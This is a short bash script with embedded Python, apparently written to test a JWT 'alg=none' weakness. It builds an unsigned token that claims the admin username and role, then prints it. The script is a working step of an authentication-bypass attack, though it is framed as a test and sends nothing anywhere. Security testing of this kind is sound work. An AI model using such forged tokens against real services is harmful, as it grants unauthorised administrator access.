#!/bin/bash
# Test JWT alg=none vulnerability

# First, let's create a JWT with alg=none using Python
python3 << 'PYEOF'
import jwt
import time
import json

payload = {
    'user_id': 'd8752136-5101-46f9-ba89-d285071396da',
    'username': 'admin',
    'role': 'admin',
    'exp': int(time.time()) + 3600
}

# Encode with algorithm 'none'
token = jwt.encode(payload, key='', algorithm='none')
print("TOKEN:" + token)
PYEOF